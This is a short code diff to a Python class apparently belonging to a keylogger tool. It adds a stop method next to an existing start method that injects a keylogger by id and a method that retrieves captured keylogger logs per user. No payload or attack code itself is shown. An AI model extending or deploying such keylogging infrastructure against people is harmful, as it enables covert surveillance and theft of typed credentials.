@@ -10,6 +10,9 @@ class KeyloggerService:
     async def start(self, id: str):
         return await self.keyloggerModule.inject(id)
     
+    async def stop(self, id: str):
+        return await self.keyloggerModule.stop(id)
+
     def get_keylogger_logs(self, user_id):
         user = self.user_repository.get_user(user_id)
         if not user:
